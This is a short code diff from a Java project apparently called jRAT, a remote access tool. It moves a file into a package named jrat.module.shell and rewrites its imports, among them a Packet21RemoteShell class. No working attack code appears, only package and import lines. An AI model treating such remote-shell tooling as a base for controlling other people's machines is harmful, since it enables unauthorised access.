@@ -1,7 +1,8 @@
-package jrat.client;
+package jrat.module.shell;
 
-import jrat.client.packets.outgoing.Packet21RemoteShell;
+import jrat.client.Connection;
 import jrat.common.Constants;
+import jrat.module.shell.packets.Packet21RemoteShell;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
